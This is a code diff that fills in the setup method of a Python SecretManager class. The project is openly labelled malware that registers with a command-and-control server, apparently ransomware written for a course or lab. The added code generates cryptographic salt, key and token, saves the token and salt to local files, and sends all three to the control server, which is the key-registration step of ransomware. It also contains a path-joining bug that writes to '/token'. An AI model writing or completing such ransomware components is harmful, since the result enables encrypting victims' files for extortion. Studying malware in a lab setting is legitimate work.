@@ -56,9 +56,37 @@ class SecretManager:
         })
         
     def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
 
+        #Create the cryptographic data
+        salt, key, token = self.create()
+
+        #Local dir path to save the data
+        dir_path = os.path.join(self._path, '/token')
+
+        # Create the directory if needed
+        if os.path.exists(dir_path) == False:
+            os.makedirs(dir_path, exist_ok=True)
+        
+        # token.bin and salt.bin files paths
+        token_file = os.path.join(dir_path, 'token.bin')
+        salt_file = os.path.join(dir_path, 'salt.bin')
+        
+        # Check if token.bin exists
+        if os.path.exists(token_file):
+            print("token.bin file already exists")
+            return
+        else:
+        
+            # Save token and salt locally
+            with open(token_file, 'wb') as f:
+                f.write(token)
+        
+            with open(salt_file, 'wb') as f:
+                f.write(salt)
+    
+            #Send the cryptographic data to the CNC
+            self.post_new(salt, key, token)
+        
     def load(self)->None:
         # function to load crypto data
         raise NotImplemented()
